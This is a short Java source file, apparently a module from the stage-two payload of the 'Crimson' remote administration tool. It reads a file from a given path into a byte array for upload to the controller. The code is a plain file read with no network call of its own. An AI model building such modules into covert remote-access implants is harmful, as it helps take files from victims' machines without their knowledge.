/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2.modules;



import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

import subterranean.crimson.universal.Reporter;

public class QuickUpload {

	public static byte[] run(String lPATH) {
		System.out.println("Uploading : " + lPATH);

		try {

			File localFile = new File(lPATH);
			byte[] buffer = new byte[(int) localFile.length()];
			BufferedInputStream bis = new BufferedInputStream(new FileInputStream(localFile));
			bis.read(buffer, 0, buffer.length);
			bis.close();
			return buffer;

		} catch (NumberFormatException | IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Reporter.report(e);
		}
		return null;
	}

}
